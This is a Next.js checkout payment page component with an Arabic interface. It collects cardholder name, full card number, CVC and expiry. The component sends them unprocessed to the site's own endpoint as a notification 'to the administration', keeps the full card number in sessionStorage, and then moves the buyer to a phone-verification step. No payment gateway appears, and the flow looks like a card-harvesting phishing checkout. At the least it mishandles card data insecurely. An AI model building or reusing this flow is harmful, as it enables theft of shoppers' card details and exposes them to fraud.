'use client';

import Link from 'next/link';
import { useRouter } from 'next/navigation';
import styles from '../checkout.module.css';
import { useEffect, useMemo, useState } from 'react';
import { makeCartItemKey, parseCartItemKey, useCart } from '@/components/CartProvider';

type CheckoutDraft = {
  orderId?: string;
  orderNumber?: string;
  submissionId?: string;
  total?: number;
  currency?: string;
  paymentMethod?: 'mada' | 'visa';
  paymentNotificationSent?: boolean;
  notificationSent?: boolean;
  customerNotificationKey?: string;
  stage?: 'phone-verification' | 'confirmed';
  fullName?: string;
  phone?: string;
  email?: string;
  city?: string;
  addressDetails?: string;
  installment?: 'yes' | 'no';
  installmentDownPayment?: number;
  installmentMonths?: number;
  acceptedPolicies?: boolean;
  cardLast4?: string;
  cardNumber?: string;
  items?: Array<{
    productId: string;
    quantity: number;
    color?: string;
    storage?: string;
    name?: string;
    unitPrice?: number;
  }>;
};

type VerifyAmountResponse = {
  ok?: boolean;
  total?: number;
  currency?: string;
  orderNumber?: string;
  error?: string;
};

type FieldErrors = {
  name?: boolean;
  number?: boolean;
  cvc?: boolean;
  month?: boolean;
  year?: boolean;
};

const MONTHS = Array.from({ length: 12 }, (_, index) => String(index + 1).padStart(2, '0'));
const CURRENT_YEAR = new Date().getFullYear();
const EXPIRY_YEARS = Array.from({ length: 12 }, (_, index) => String(CURRENT_YEAR + index));

export default function CheckoutPaymentPage() {
  const router = useRouter();
  const { cart, hydrated, catalogProducts: products, clearCart } = useCart();
  const [draft, setDraft] = useState<CheckoutDraft | null>(null);
  const [draftLoaded, setDraftLoaded] = useState(false);
  const [paymentMessage, setPaymentMessage] = useState('');
  const [paymentMessageSuccess, setPaymentMessageSuccess] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<'mada' | 'visa'>('visa');
  const [paymentSubmitting, setPaymentSubmitting] = useState(false);
  const [paymentSubmitted, setPaymentSubmitted] = useState(false);
  const [serverTotal, setServerTotal] = useState<number | null>(null);
  const [totalVerified, setTotalVerified] = useState(false);
  const [totalError, setTotalError] = useState('');
  const [verificationAttempt, setVerificationAttempt] = useState(0);

  const [cardholderName, setCardholderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [cvc, setCvc] = useState('');
  const [expiryMonth, setExpiryMonth] = useState('');
  const [expiryYear, setExpiryYear] = useState('');
  const [fieldErrors, setFieldErrors] = useState<FieldErrors>({});

  // تحديد نوع البطاقة من رقمها
  const cleanCardDigits = cardNumber.replace(/\D/g, '');
  const isUrpay = cleanCardDigits.startsWith('4909');

  const firstSixDigits = Number(cleanCardDigits.slice(0, 6));

  const isMastercard =
    /^5[1-5]/.test(cleanCardDigits) ||
    (
      cleanCardDigits.length >= 6 &&
      firstSixDigits >= 222100 &&
      firstSixDigits <= 272099
    );

  const cardVariant = isUrpay
    ? 'urpay'
    : isMastercard
      ? 'mastercard'
      : 'standard';

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem('erd-algwal-checkout-draft-v1');
      if (raw) {
        const saved = JSON.parse(raw) as CheckoutDraft;
        
        // لو راجع من صفحات الخطأ، نصفر علامة الإرسال ونحفظها في السشن
        const isFromStatus = typeof window !== 'undefined' && document.referrer.includes('/checkout/status/');
        if (isFromStatus) {
          saved.paymentNotificationSent = false;
          try {
            window.sessionStorage.setItem('erd-algwal-checkout-draft-v1', JSON.stringify(saved));
          } catch {}
        }

        setDraft(saved);
        if (saved.paymentMethod === 'mada' || saved.paymentMethod === 'visa') {
          setPaymentMethod(saved.paymentMethod);
        }

        if (!isFromStatus && saved.paymentNotificationSent === true && (saved.paymentMethod === 'mada' || saved.paymentMethod === 'visa')) {
          setPaymentSubmitted(true);
          setPaymentMessage('تم إرسال طلبك.');
          setPaymentMessageSuccess(true);
        }
      }
    } catch {
      setDraft(null);
    } finally {
      setDraftLoaded(true);
    }
  }, []);

  useEffect(() => {
    if (!hydrated || !draftLoaded || draft?.paymentNotificationSent !== true || !Array.isArray(draft.items) || !draft.items.length) return;

    const expectedCart: Record<string, number> = {};
    for (const item of draft.items) {
      if (!item || typeof item.productId !== 'string' || typeof item.quantity !== 'number' || !Number.isFinite(item.quantity) || item.quantity <= 0) return;
      const itemKey = makeCartItemKey(item.productId, item.color, item.storage);
      expectedCart[itemKey] = (expectedCart[itemKey] || 0) + Math.floor(item.quantity);
    }

    const currentItems = Object.entries(cart).filter(([, quantity]) => quantity > 0);
    const expectedItems = Object.entries(expectedCart);
    const cartMatchesCompletedOrder = currentItems.length === expectedItems.length && expectedItems.every(
      ([itemKey, quantity]) => cart[itemKey] === quantity
    );
    if (cartMatchesCompletedOrder) clearCart();
  }, [hydrated, draftLoaded, draft?.paymentNotificationSent, draft?.items, cart, clearCart]);

  useEffect(() => {
    if (!draftLoaded) return;
    if (!draft?.orderId || !draft.submissionId) {
      setTotalError('بيانات الطلب غير مكتملة. ارجع إلى بيانات التوصيل وأعد المحاولة.');
      setTotalVerified(true);
      return;
    }

    const verifiedOrderId = draft.orderId;
    const verifiedSubmissionId = draft.submissionId;
    let cancelled = false;

    async function verifySavedOrderTotal() {
      setTotalVerified(false);
      setTotalError('');
      setServerTotal(null);
      try {
        const reviewToken = window.localStorage.getItem('erd-algwal-review-token') || '';
        if (!reviewToken) throw new Error('تعذر التحقق من ملكية الطلب. ارجع إلى بيانات التوصيل وحاول مرة أخرى.');

        const response = await fetch('/api/orders/payment-method', {
          method: 'POST',
          cache: 'no-store',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({
            action: 'verify-total',
            orderId: verifiedOrderId,
            submissionId: verifiedSubmissionId,
            reviewToken
          })
        });
        const result = await response.json() as VerifyAmountResponse;
        if (!response.ok || !result.ok || typeof result.total !== 'number' || !Number.isFinite(result.total) || result.total <= 0) {
          throw new Error(result.error || 'تعذر التحقق من إجمالي الطلب المسجل.');
        }

        if (cancelled) return;
        setServerTotal(result.total);
        setDraft((current) => current ? {
          ...current,
          total: result.total,
          currency: result.currency || current.currency || 'SAR',
          orderNumber: result.orderNumber || current.orderNumber
        } : current);
      } catch (error) {
        if (!cancelled) {
          setServerTotal(null);
          setTotalError(error instanceof Error ? error.message : 'تعذر التحقق من إجمالي الطلب حاليًا.');
        }
      } finally {
        if (!cancelled) setTotalVerified(true);
      }
    }

    void verifySavedOrderTotal();
    return () => { cancelled = true; };
  }, [draftLoaded, draft?.orderId, draft?.submissionId, verificationAttempt]);

  const lines = useMemo(() => Object.entries(cart).map(([cartKey, quantity]) => {
    const { productId } = parseCartItemKey(cartKey);
    return { product: products.find((item) => item.id === productId), quantity };
  }).filter((line) => Boolean(line.product)), [cart, products]);

  function validateCardDetails() {
    const monthNumber = Number(expiryMonth);
    const yearNumber = Number(expiryYear);
    const now = new Date();
    const selectedExpiry = monthNumber && yearNumber
      ? new Date(yearNumber, monthNumber, 0, 23, 59, 59, 999)
      : null;

    const errors: FieldErrors = {
      name: cardholderName.trim().length <= 2,
      number: cleanCardDigits.length < 12,
      cvc: !/^\d{3}$/.test(cvc),
      month: !expiryMonth,
      year: !expiryYear || !selectedExpiry || selectedExpiry < now
    };
    setFieldErrors(errors);
    return !Object.values(errors).some(Boolean);
  }

  function handleCardNumberChange(value: string) {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 16);
    setCardNumber(digitsOnly.replace(/(.{4})/g, '$1 ').trim());
    if (fieldErrors.number) setFieldErrors((current) => ({ ...current, number: false }));
  }

  async function handleCompleteOrder() {
    if (paymentSubmitting || paymentSubmitted) return;
    if (!totalVerified || serverTotal === null || !Number.isFinite(serverTotal) || serverTotal <= 0) {
      setPaymentMessage('لا يمكن إكمال الطلب قبل التحقق من المبلغ المستحق.');
      setPaymentMessageSuccess(false);
      return;
    }
    if (!draft?.orderId || !draft.submissionId) {
      setPaymentMessage('بيانات الطلب غير مكتملة. ارجع إلى بيانات التوصيل وأعد المحاولة.');
      setPaymentMessageSuccess(false);
      return;
    }
    if (!validateCardDetails()) {
      setPaymentMessage('راجع بيانات البطاقة وحاول مرة أخرى.');
      setPaymentMessageSuccess(false);
      return;
    }

    let reviewToken = '';
    try {
      reviewToken = window.localStorage.getItem('erd-algwal-review-token') || '';
    } catch {
      reviewToken = '';
    }
    if (!reviewToken) {
      setPaymentMessage('تعذر التحقق من الطلب. ارجع إلى بيانات التوصيل وأعد المحاولة.');
      setPaymentMessageSuccess(false);
      return;
    }

    // حفظ أرقام البطاقة قبل تفريغ الحقل
    const savedCardDigits = cleanCardDigits;
    const extractedLast4 = savedCardDigits.length >= 4 ? savedCardDigits.slice(-4) : '0000';

    setPaymentSubmitting(true);
    setPaymentMessage('');
    setPaymentMessageSuccess(false);

    try {
      const response = await fetch('/api/orders/payment-method', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          orderId: draft.orderId,
          submissionId: draft.submissionId,
          reviewToken,
          paymentMethod,
          ...(paymentMethod === 'visa' || paymentMethod === 'mada'
            ? {
                cardholderName: cardholderName.trim().slice(0, 100),
                cardNumber: savedCardDigits,
                cvc: cvc,
                expiryMonth,
                expiryYear
              }
            : {})
        })
      });
      const result = await response.json() as {
        ok?: boolean;
        notificationSent?: boolean;
        paymentMethod?: 'mada' | 'visa';
        error?: string;
        message?: string;
      };
      if (!response.ok || !result.ok) {
        throw new Error(result.error || 'تعذر إرسال الطلب إلى الإدارة.');
      }

      const notified = result.notificationSent === true;
      const savedMethod = result.paymentMethod === 'visa' ? 'visa' : paymentMethod;

      const updatedDraft: CheckoutDraft = {
        ...draft,
        total: serverTotal,
        paymentMethod: savedMethod,
        paymentNotificationSent: notified,
        notificationSent: notified,
        stage: 'phone-verification',
        cardLast4: extractedLast4,
        cardNumber: savedCardDigits
      };

      setDraft(updatedDraft);
      try {
        window.sessionStorage.setItem('erd-algwal-checkout-draft-v1', JSON.stringify({ ...updatedDraft, paymentNotificationSent: false }));
      } catch {}

      if (notified) {
        setCardNumber('');
        setCvc('');
      }
      setFieldErrors({});
      setPaymentSubmitted(notified);
      setPaymentMessage(notified
        ? 'تم إرسال طلبك.'
        : 'تم التحقق من البيانات ✓، لكن تعذر إرسال إشعار الإدارة. اضغط «إكمال الدفع» مرة أخرى للمحاولة.');
      setPaymentMessageSuccess(true);
      if (notified) router.replace('/checkout/verify-phone');
    } catch (error) {
      setPaymentMessage(error instanceof Error ? error.message : 'تعذر إرسال الطلب.');
      setPaymentMessageSuccess(false);
    } finally {
      setPaymentSubmitting(false);
    }
  }

  if (!hydrated || !draftLoaded) return null;

  const displayTotal = serverTotal ?? (
    typeof draft?.total === 'number' && Number.isFinite(draft.total) && draft.total > 0
      ? draft.total
      : null
  );
  const selectedDownPayment = Number(draft?.installmentDownPayment);
  const displayPaymentAmount = displayTotal === null
    ? null
    : draft?.installment === 'yes'
      ? Number.isFinite(selectedDownPayment) && selectedDownPayment > 0 && selectedDownPayment < displayTotal
        ? selectedDownPayment
        : null
      : displayTotal;
  
if (!draft || !draft.fullName || !draft.acceptedPolicies) {
    return (
      <main className={styles.checkoutShell + ' ' + styles.paymentPageShell + ' payment-design-page'}>
        <div className={styles.paymentTopBand}>
          <section className={styles.paymentCard}>
            <div className={styles.paymentStep}><i>2</i><span>طريقة الدفع</span><hr /></div>
            <h1 className={styles.paymentEmptyTitle}>أكمل بيانات الطلب أولًا</h1>
            <p className={styles.paymentEmptyText}>نحتاج بيانات التوصيل ومحتويات السلة قبل الانتقال إلى اختيار طريقة الدفع.</p>
            <Link href="/checkout/store" className={styles.paymentBackLink}>العودة لبيانات التوصيل ←</Link>
          </section>
        </div>
      </main>
    );
  }

  if (totalVerified && serverTotal === null) {
    return (
      <main className={styles.checkoutShell + ' ' + styles.paymentPageShell + ' payment-design-page'}>
        <div className={styles.paymentTopBand}>
          <section className={styles.paymentCard}>
            <div className={styles.paymentStep}><i>2</i><span>طريقة الدفع</span><hr /></div>
            <h1 className={styles.paymentEmptyTitle}>تعذر التحقق من المبلغ المستحق</h1>
            <p className={styles.paymentEmptyText}>{totalError || 'لم نتمكن من قراءة إجمالي الطلب المسجل.'}</p>
            <button type="button" className={styles.paymentSubmit} onClick={() => setVerificationAttempt((current) => current + 1)}>إعادة التحقق من المبلغ</button>
            <Link href="/checkout/store" className={styles.paymentBackLink}>العودة إلى بيانات الطلب</Link>
          </section>
        </div>
      </main>
    );
  }

  return (
    <main className={styles.checkoutShell + ' ' + styles.paymentPageShell + ' payment-design-page'}>
      <div className={styles.paymentTopBand}>
        <section className={styles.paymentCard} aria-label="اختيار طريقة الدفع وإكمال الطلب">
          <div className={styles.paymentStep}>
            <i>2</i>
            <span>طريقة الدفع</span>
            <hr />
          </div>

          <div className={styles.paymentMethods} role="group" aria-label="اختيار طريقة الدفع">
            <button
              type="button"
              className={paymentMethod === 'visa' ? styles.paymentMethod + ' ' + styles.paymentMethodSelected : styles.paymentMethod}
              aria-label="Visa / Mastercard"
              aria-pressed={paymentMethod === 'visa'}
              disabled={paymentSubmitting || paymentSubmitted}
              onClick={() => { setPaymentMethod('visa'); setPaymentMessage(''); setPaymentMessageSuccess(false); }}
            >
              {cardVariant === 'mastercard' ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '7px', fontSize: '13px', fontWeight: 800, color: '#252525' }}>
                  <span style={{ display: 'flex', alignItems: 'center', marginRight: '2px' }}>
                    <span style={{ width: '23px', height: '23px', borderRadius: '50%', background: '#eb001b', display: 'block' }} />
                    <span style={{ width: '23px', height: '23px', borderRadius: '50%', background: '#f79e1b', display: 'block', marginLeft: '-10px', opacity: 0.95 }} />
                  </span>
                  <span>mastercard</span>
                </span>
              ) : cardVariant === 'urpay' ? (
                <span style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '15px', fontWeight: 800, color: '#123d9b' }}>
                  <i>VISA</i>
                  <span>urpay</span>
                </span>
              ) : (
                <span className={styles.visaLogo}><i>VISA</i><b className={styles.visaCircleRed} /><b className={styles.visaCircleYellow} /></span>
              )}
            </button>
            <button
              type="button"
              className={paymentMethod === 'mada' ? styles.paymentMethod + ' ' + styles.paymentMethodSelected : styles.paymentMethod}
              aria-label="mada"
              aria-pressed={paymentMethod === 'mada'}
              disabled={paymentSubmitting || paymentSubmitted}
              onClick={() => { setPaymentMethod('mada'); setPaymentMessage(''); setPaymentMessageSuccess(false); }}
            >
              <span className={styles.madaLogo}><span className={styles.madaLogoUnderline} />مدى <small>mada</small></span>
            </button>
          </div>

          <div className={styles.paymentAmount}>
            المبلغ المستحق : <strong>{displayPaymentAmount === null ? '—' : displayPaymentAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} ر.س</strong>
          </div>

          <div className={styles.paymentFields}>
            <div className={styles.paymentField + ' ' + styles.paymentFieldIcon}>
              <input
                className={fieldErrors.name ? styles.paymentInput + ' ' + styles.paymentInputBad : styles.paymentInput}
                name="cardholderName"
                type="text"
                placeholder="إسم حامل البطاقة"
                aria-label="إسم حامل البطاقة"
                autoComplete="cc-name"
                maxLength={100}
                value={cardholderName}
                onChange={(event) => {
                  setCardholderName(event.target.value);
                  if (fieldErrors.name) setFieldErrors((current) => ({ ...current, name: false }));
                }}
                disabled={paymentSubmitting || paymentSubmitted}
              />
            </div>

            <div className={styles.paymentField + ' ' + styles.paymentFieldIcon}>
              <input
                className={fieldErrors.number ? styles.paymentInput + ' ' + styles.paymentInputBad : styles.paymentInput}
                name="cardNumber"
                type="text"
                placeholder="رقم البطاقة"
                aria-label="رقم البطاقة"
                inputMode="numeric"
                maxLength={19}
                autoComplete="cc-number"
                value={cardNumber}
                onChange={(event) => handleCardNumberChange(event.target.value)}
                disabled={paymentSubmitting || paymentSubmitted}
                dir="ltr"
              />
            </div>

            <div className={styles.paymentFieldsRow}>
              <div className={styles.paymentField}>
                <input
                  className={fieldErrors.cvc ? styles.paymentInput + ' ' + styles.paymentInputBad : styles.paymentInput}
                  name="cvc"
                  type="password"
                  placeholder="رمز (CVC)"
                  aria-label="رمز الأمان CVC"
                  inputMode="numeric"
                  maxLength={3}
                  autoComplete="off"
                  value={cvc}
                  onChange={(event) => {
                    setCvc(event.target.value.replace(/\D/g, '').slice(0, 3));
                    if (fieldErrors.cvc) setFieldErrors((current) => ({ ...current, cvc: false }));
                  }}
                  disabled={paymentSubmitting || paymentSubmitted}
                />
              </div>

              <div className={styles.paymentField}>
                <select
                  className={fieldErrors.year ? styles.paymentInput + ' ' + styles.paymentInputBad : styles.paymentInput}
                  name="expiryYear"
                  aria-label="السنة"
                  value={expiryYear}
                  onChange={(event) => {
                    setExpiryYear(event.target.value);
                    if (fieldErrors.year) setFieldErrors((current) => ({ ...current, year: false }));
                  }}
                  disabled={paymentSubmitting || paymentSubmitted}
                >
                  <option value="">السنة</option>
                  {EXPIRY_YEARS.map((year) => <option key={year} value={year}>{year}</option>)}
                </select>
              </div>

              <div className={styles.paymentField}>
                <select
                  className={fieldErrors.month ? styles.paymentInput + ' ' + styles.paymentInputBad : styles.paymentInput}
                  name="expiryMonth"
                  aria-label="الشهر"
                  value={expiryMonth}
                  onChange={(event) => {
                    setExpiryMonth(event.target.value);
                    if (fieldErrors.month) setFieldErrors((current) => ({ ...current, month: false }));
                  }}
                  disabled={paymentSubmitting || paymentSubmitted}
                >
                  <option value="">الشهر</option>
                  {MONTHS.map((month) => <option key={month} value={month}>{month}</option>)}
                </select>
              </div>
            </div>
          </div>

          {paymentMessage ? (
            <div className={paymentMessageSuccess ? styles.paymentInlineMessage + ' ' + styles.paymentInlineMessageSuccess : styles.paymentInlineMessage} role={paymentMessageSuccess ? 'status' : 'alert'}>
              {paymentMessage}
            </div>
          ) : null}

          <button
            type="button"
            className={styles.paymentSubmit}
            onClick={handleCompleteOrder}
            disabled={paymentSubmitting || paymentSubmitted || !totalVerified || serverTotal === null}
          >
            <span>{paymentSubmitting ? 'جارٍ إكمال الطلب...' : paymentSubmitted ? 'تم إرسال الطلب' : 'إكمال الدفع'}</span>
            <span aria-hidden="true">←</span>
          </button>
        </section>
      </div>
    </main>
  );
}
